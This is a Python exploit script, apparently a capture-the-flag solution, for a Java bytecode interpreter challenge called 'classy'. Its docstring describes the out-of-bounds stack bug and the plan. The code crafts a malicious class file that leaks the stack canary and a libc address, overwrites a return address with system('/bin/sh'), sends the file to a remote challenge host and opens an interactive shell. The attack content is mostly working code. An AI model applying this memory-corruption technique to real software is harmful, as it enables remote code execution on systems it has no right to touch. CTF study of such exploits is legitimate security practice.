#!/usr/bin/python
'''
Classy is a java interpreter with some limitations (class must have
exactly two functions, does not support longs and many instructions,
etc). We give it a class file to be validated and run. A simple hello
world java program works.

Java has a stack and a local variables array. In classy, both of these
live on the stack and grow upwards. The bug that this exploits is that
theclassy interpreter does not bound the size of the stack, or the
indexes into the local variables array.

The stack and the local variables array are both implemented as an array
of StackItems. The structure looks like:

struct StackItems {
  uint32_t tag;
  uint32_t value;
};

We only control the value field. Since the stack push and local store
instructions will write a tag corresponding to the type of the value
(for example, the tag for integers is 0x2f).

The plan is to leak a libc address and exceed the bounds of the stack or
the local variable array to overwrite the return address for
UserDefinedFunction::fake_thiscall. Unfortunately, in order to leak a
libc address, it needs to 8 byte aligned with respect to the beginning
of the local variables array (which it is), and it must have a 0x2f
before it so that we can read it a an integer (which it doesn't).

Luckily, it turns out that while the beginning of the local variable
array has an address ending in 4 or c, the start of the stack has an
address ending in 0 or 8. This means that the value field for a stack
entry can overlap with the tag field for a local variable array entry.

By pushing enough 0x2fs to place 0x2f immediately before the stack
canary, we can read it as an integer (this is important, since we will
need to clobber the stack canary in order to leak a libc address).

Then we can use the same trick with pushing more 0x2fs to leak main's
return address, which gives us an address inside of __libc_start_main.
We then compute the address of system and "/bin/sh" inside of our java
code, and overwrite the return address with a call to system("/bin/sh").

The final step is to replace the stack canary and return from our java
function, which gets us a shell.
'''

import socket
import struct
import sys
import telnetlib

class_template = ''.join('''
cafe babe 0000 0033 001c 0a00 0600 0f09
0010 0011 03de adbe ef0a 0012 0013 0700
1407 0015 0100 063c 696e 6974 3e01 0003
2829 5601 0004 436f 6465 0100 0f4c 696e
654e 756d 6265 7254 6162 6c65 0100 046d
6169 6e01 0016 285b 4c6a 6176 612f 6c61
6e67 2f53 7472 696e 673b 2956 0100 0a53
6f75 7263 6546 696c 6501 0009 5465 7374
2e6a 6176 610c 0007 0008 0700 160c 0017
0018 0700 190c 001a 001b 0100 0454 6573
7401 0010 6a61 7661 2f6c 616e 672f 4f62
6a65 6374 0100 106a 6176 612f 6c61 6e67
2f53 7973 7465 6d01 0003 6f75 7401 0015
4c6a 6176 612f 696f 2f50 7269 6e74 5374
7265 616d 3b01 0013 6a61 7661 2f69 6f2f
5072 696e 7453 7472 6561 6d01 0007 7072
696e 746c 6e01 0004 2849 2956 0021 0005
0006 0000 0000 0002 0001 0007 0008 0001
0009 0000 001d 0001 0001 0000 0005 2ab7
0001 b100 0000 0100 0a00 0000 0600 0100
0000 0100 0900 0b00 0c00 0100 0900 0000
2500 0200 0100 0000 09b2 0002 1203 b600
04b1 0000 0001 000a 0000 000a 0002 0000
0003 0008 0004 0001 000d 0000 0002 000e
'''.split()).decode('hex')

def pb4(v):
    return struct.pack('>I', v)

def pb2(v):
    return struct.pack('>H', v)

def push_int(x):
    high = x >> 16
    low = x & 0xffff
    code = ''

    # push in two halfs to avoid sign issues.

    code += '\x11' + pb2(low / 2) # sipush low
    code += '\x11' + pb2((low + 1) / 2) # sipush low
    code += '\x60' # iadd

    code += '\x11' + pb2(high / 2) # sipush high
    code += '\x11' + pb2((high + 1) / 2) # sipush high
    code += '\x60' # iadd

    code += '\x11' + pb2(16)   # sipush 16
    code += '\x78' # ishl
    code += '\x80' # ior
    return code

code = ''

# Spray 0x2f (StackItem::INTEGER)
code += '\x11\x00\x2f' * 9 # sipush 0x2f
code += '\x57' * 0x9 # pop
# Read the stack canary
code += '\x15\x0d' # iload 0xd

# Spray 0x2f (StackItem::INTEGER)
code += '\x11\x00\x2f' * 0x28 # sipush 0x2f
code += '\x57' * 0x28 # pop
# Read libc addr
code += '\x15\x2d' # iload 0x2d

libc_start_main_offset = 0x19a63
system_offset = 0x3fc40
binsh_offset = 0x15E324

code += push_int(libc_start_main_offset)
code += '\x64' # isub
code += '\x59' # dup

code += push_int(system_offset)
code += '\x60' # iadd
code += '\x5f' # swap

code += push_int(binsh_offset)
code += '\x60' # iadd

# put binsh
code += '\x36\x10' # istore 0x10
# put system
code += '\x36\x0f' # istore 0xf

# put back the stack canary
code += '\x36\x0d' # istore 0xd

code += '\xb1' # ret

# https://docs.oracle.com/javase/specs/jvms/se7/html/jvms-4.html
# describes the format of a class file. This replaces the code length
# and code array with our bytecode.
data = class_template[:0x155] + pb4(len(code)) + code + class_template[0x162:]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('classy.9447.plumbing', 9447))
f = s.makefile('rw', bufsize=0)

f.write(data)

t = telnetlib.Telnet()
t.sock = s
t.interact()

